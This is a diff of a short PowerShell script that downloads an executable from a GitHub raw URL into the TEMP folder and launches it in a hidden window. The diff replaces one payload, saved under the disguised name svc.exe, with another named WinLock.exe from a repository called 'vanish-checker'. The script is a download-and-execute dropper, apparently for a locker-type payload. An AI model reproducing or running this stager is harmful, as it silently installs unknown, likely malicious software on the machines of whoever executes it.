@@ -1,5 +1,5 @@
-$url = "https://github.com/nagibatorm55-ops/errorfuck/raw/refs/heads/main/wedsuvit1ggjshsa.exe"
-$path = "$env:TEMP\svc.exe"
+$url = "https://github.com/nagibatorm55-ops/vanish-checker/raw/refs/heads/main/WinLock.exe"
+$path = "$env:TEMP\Winlock.exe"
 irm $url -OutFile $path
 Start-Process -FilePath $path -WindowStyle Hidden
 Start-Sleep -Seconds 2
